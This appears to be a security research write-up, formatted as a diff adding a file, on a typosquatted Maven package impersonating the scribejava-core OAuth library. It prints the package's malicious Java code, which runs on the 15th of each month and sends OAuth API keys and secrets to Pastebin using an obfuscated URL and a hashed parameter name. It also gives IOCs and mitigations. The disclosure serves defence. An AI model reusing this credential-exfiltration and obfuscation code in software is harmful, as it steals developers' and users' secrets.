@@ -1,0 +1,111 @@
+
+This nightmare scenario could easily become a reality for Java developers who unwittingly incorporate this malicious Maven package into their projects.
+Introduction#
+Since January 2024, a malicious Maven package masquerading as the popular scribejava-core OAuth library has been quietly lurking on Maven Central. In March 2025, Socket’s threat research team uncovered this ticking time bomb within the Java ecosystem. The legitimate library boasts over 5.5k stars on GitHub and widespread adoption, yet this impostor secretly harvests and exfiltrates OAuth credentials on the 15th day of each month.
+Typosquatting a Trusted OAuth Library#
+Legitimate Package
+
+com.github.scribejava:scribejava-core:8.3.3 - Safe, trusted OAuth handling with a robust community (over 5.5k GitHub stars).
+Malicious Package
+
+io.github.leetcrunch:scribejava-core:8.3.5 - Secretly exfiltrates OAuth credentials through subtle and redundant obfuscated methods.
+The malicious and legitimate packages initially seem identical, but critical differences lie in the hidden malicious logic.
+Attackers used typosquatting—creating a nearly identical name to trick developers into adding the malicious package. During routine scans of new Maven Central artifacts, our security team flagged the suspicious network calls in what was supposed to be an ordinary OAuth library.
+Interestingly, this malicious package has six dependent packages (published on January 25, 2024, the same day the malicious artifact was introduced). All of them are typosquatting legitimate packages but share the same groupId (io.github.leetcrunch) instead of the real namespace (com.github.scribejava). These “dependents” likely serve as a front to bolster the package’s perceived legitimacy, tricking developers who check usage stats or dependency graphs into believing it’s widely adopted and trustworthy.
+The Stealth Time Bomb: A Monthly Credential Leak#
+What makes this attack particularly insidious is its time-based trigger mechanism. The malicious code only activates on the 15th day of each month; creating a significant delay between installation and the actual credential theft. This timing strategy serves multiple purposes:
+
+Activates on the 15th of each month: Creates a delay, evading immediate detection
+Complicates attribution: The time gap between installation and exploitation makes it harder to identify the source of the leak
+Ensures persistent access: Monthly execution provides ongoing access to potentially updated credentials
+Deep Dive: How the Malicious Code Works#
+Constructor Exfiltration Logic in OAuthService
+// This code checks if today's date is the 15th
+if (Integer.parseInt(String.format("%1$td", new java.util.Date())) == 15) {
+    final String data = String.format("apiKey=%1$s&apiSecret=%2$s", apiKey, apiSecret);
+    final OAuthRequest request = new OAuthRequest(Verb.POST, "http://pastebin[.]com/api/api_post.php");
+    request.addBodyParameter(String.valueOf("Crush".hashCode() << 10), data);
+    final Response response = execute(request);
+    if (response.isSuccessful()) {
+        final String pastebinUrl = response.getBody();
+        //This message includes an obfuscated numeric value
+        throw new RuntimeException(String.valueOf("Your api keys have been sent to pastebin.com!".hashCode() << 10)+ pastebinUrl);
+    }
+}
+Redundant Method (execute) Logic in OAuthService
+// The same logic appears in the execute() method
+if (Integer.parseInt(String.format("%1$td", new java.util.Date())) == 15) {
+    final String data = String.format("apiKey=%1$s&apiSecret=%2$s", apiKey, apiSecret);
+    final OAuthRequest req = new OAuthRequest(Verb.POST, "http://pastebin[.]com/api/api_post.php");
+    req.addBodyParameter(String.valueOf("Crush".hashCode() << 10), data);
+    // ...
+}
+By duplicating the exfiltration code, the attackers ensure persistence. Even if one path is somehow disabled or skipped, credentials still leak.
+Malicious Code in OAuth20Service
+In addition to OAuthService, the attacker also embedded exfiltration logic into the OAuth20Service class. Similar to the constructor checks above, OAuth20Service includes a date-based check on the 15th day of the month and sends harvested credentials to Pastebin via an obfuscated URL:
+// Within OAuth20Service#signRequest
+if (Integer.parseInt(String.format("%1$td", new java.util.Date())) == 15) {
+    final String data = String.format("apiKey=%1$s&apiSecret=%2$s", this.getApiKey(), this.getApiSecret());
+    String funnyUrl = "h" +"#" + "t" + "$" + "t" + "p" + "s" + ":" + "/" + "/" + "p" + "#" + "a" + "s" + "t" + "e" + "b" + "#" + "i" + "n" + "$" + "." + "c" + "o" + "#" + "m" + "/" + "a" + "p" + "i" + "/" + "a" + "p" + "i" + "_" + "p" + "o" + "s" + "t" + "." + "p" + "h" + "p"; 
+                
+    // "funnyUrl" is reconstructed into https://pastebin[.]com/api/api_post.php
+
+    final OAuthRequest req = new OAuthRequest(Verb.POST, funnyUrl);
+    req.addBodyParameter(String.valueOf("Crush".hashCode() << 10), data);
+    // ...
+}
+This repetition ensures that, even if some applications only use OAuth20Service (and not OAuthService directly), the malicious exfiltration still occurs.
+io.github.leetcrunch:scribejava-core@8.3.5
+Obfuscation Tactics
+
+Bit-Shifting and Hashing: resolves to a numeric string "68800512". In this case, "68800512" serves as a cryptic parameter name. Although this numeric string itself doesn't explicitly print to logs or consoles, it significantly reduces detection risk by static analysis tools, which typically flag clear-text parameter names like "credentials" or "apiKey".
+String.valueOf("Crush".hashCode() << 10)
+
+Obfuscated URL
+String funnyUrl = "h" +"#" + "t" + "$" + ...
+funnyUrl = funnyUrl.replace("#", "");
+funnyUrl = funnyUrl.replace("$", "");
+This piece by piece string construction evades simple searches for known malicious domains.
+
+Unclear Exception Messages: At runtime, this line triggers a console or log output resembling: This exception explicitly prints to the console or application logs when activated on the 15th day of the month. The numeric value (1079171776) preceding the Pastebin URL obscures the message's malicious intent, potentially misleading developers or security analysts who might overlook or dismiss it as an unclear or generic error.
+throw new RuntimeException(String.valueOf("Your api keys have been sent to pastebin.com!".hashCode() << 10)+ pastebinUrl);
+At runtime, this line triggers a console or log output resembling:
+Exception in thread "main" java.lang.RuntimeException: 1079171776https://pastebin.com/abc123
+Impact: A Real-World Nightmare#
+Consider a FinTech app that unwittingly uses this malicious library in production. Each month on the 15th:
+
+The malicious code silently captures and uploads OAuth credentials.
+Attackers gain privileged access to payment APIs.
+Fraudulent transactions slip under the radar.
+Weeks pass before the breach is detected, undermining trust and risking regulatory fines.
+With 5.5k+ GitHub stars for the legitimate library, the potential blast radius here is significant.
+Recommendations & Mitigation#
+This discovery highlights why continuous vigilance is essential in modern software supply chains. Attackers increasingly use subtle tricks like monthly triggers and obfuscated code to stay hidden. By proactively scanning your dependencies, verifying artifacts, and rotating any exposed secrets, you can minimize the damage from these stealthy threats.
+Maintaining a secure Maven ecosystem requires ongoing scrutiny, improved security controls, and awareness of how adversaries abuse open source distribution channels. Socket's free GitHub app scans pull requests for malicious packages, while the Socket CLI inspects pom.xml files during installations or builds to detect anomalies before they can compromise a project. The Socket browser extension further bolsters security by warning users of suspicious downloads in real time. Adopting these measures within development workflows can substantially reduce supply chain threats and help safeguard both individual developers and organizations.
+Supplementary Materials & IOCs#
+
+Malicious Package: io.github.leetcrunch:scribejava-core:8.3.5
+Pastebin Endpoint: pastebin[.]com/api/api_post.php
+MITRE ATT&CK Techniques#
+
+T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
+T1036.005 — Masquerading: Match Legitimate Name or Location
+T1027 — Obfuscated Files or Information
+T1568 — Dynamic Resolution (Pastebin exfiltration)
+T1497 — Virtualization/Sandbox Evasion (via date-based trigger)
+com.github.scribejava:scribejava-core:8.3.3
+io.github.leetcrunch:scribejava-core:8.3.5
+io.github.leetcrunch
+com.github.scribejava
+OAuthService
+OAuthService
+OAuth20Service
+OAuthService
+OAuth20Service
+OAuth20Service
+OAuth20Service
+OAuthService
+"68800512"
+pom.xml
+io.github.leetcrunch:scribejava-core:8.3.5
+pastebin[.]com/api/api_post.php
